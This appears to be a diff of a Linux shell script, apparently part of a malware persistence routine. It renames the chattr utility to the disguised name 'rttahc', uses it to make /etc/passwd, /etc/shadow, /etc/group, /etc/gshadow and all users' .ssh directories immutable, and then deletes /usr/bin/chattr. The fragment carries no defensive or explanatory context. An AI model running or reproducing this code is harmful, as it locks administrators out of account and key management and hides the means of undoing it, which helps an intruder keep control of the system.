@@ -133,14 +133,13 @@ rttahc -R -i /home/*/.ssh
 }
 
 chattrOn() {
-chattr +i /etc/passwd
-chattr +i /etc/shadow
-chattr +i /etc/group
-chattr +i /etc/gshadow
-
-chattr -R +i /home/*/.ssh
-
 cp /usr/bin/chattr /usr/bin/rttahc
+rttahc +i /etc/passwd
+rttahc +i /etc/shadow
+rttahc +i /etc/group
+rttahc +i /etc/gshadow
+
+rttahc -R +i /home/*/.ssh
 
 rm -rf /usr/bin/chattr
 
